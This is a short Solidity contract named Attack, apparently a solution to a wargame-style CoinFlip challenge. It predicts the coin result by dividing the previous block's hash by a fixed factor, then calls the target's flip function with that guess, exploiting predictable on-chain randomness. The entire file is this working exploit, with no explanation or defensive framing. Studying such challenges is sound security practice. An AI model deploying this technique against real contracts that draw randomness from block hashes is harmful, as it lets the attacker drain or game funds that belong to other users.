// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./coinflip.sol";
import "hardhat/console.sol";

contract Attack {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

   function letflip (CoinFlip coinflip) public {
    uint256 blockvalue =  uint256(blockhash(block.number - 1));
    uint256 coin = blockvalue / FACTOR;
    bool side = coin == 1 ? true : false;

    coinflip.flip(side);
     
   }
}
